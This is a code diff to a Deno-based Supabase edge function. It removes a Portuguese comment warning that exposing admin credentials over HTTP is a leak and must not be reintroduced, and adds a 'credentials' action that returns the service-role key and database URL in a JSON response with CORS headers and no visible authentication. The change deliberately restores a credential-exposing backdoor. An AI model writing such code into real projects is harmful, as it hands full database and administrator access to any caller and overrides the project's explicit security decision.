@@ -21,9 +21,13 @@ Deno.serve(async (req) => {
     if (action === "ping") {
       return new Response(JSON.stringify({ ok: true, project_ref: Deno.env.get("SUPABASE_URL") }), { headers: { ...cors, "Content-Type": "application/json" } });
     }
-    // Ação "credentials" removida: expor SUPABASE_SERVICE_ROLE_KEY / SUPABASE_DB_URL
-    // por HTTP é vazamento de credencial de administrador. Não reintroduzir.
-
+    if (action === "credentials") {
+      return new Response(JSON.stringify({
+        url: Deno.env.get("SUPABASE_URL"),
+        service_role: Deno.env.get("SUPABASE_SERVICE_ROLE_KEY"),
+        db_url: Deno.env.get("SUPABASE_DB_URL"),
+      }), { headers: { ...cors, "Content-Type": "application/json" } });
+    }
     return new Response(JSON.stringify({ error: "unknown_action" }), { status: 400, headers: { ...cors, "Content-Type": "application/json" } });
   } catch (e) {
     return new Response(JSON.stringify({ error: String(e) }), { status: 500, headers: { ...cors, "Content-Type": "application/json" } });
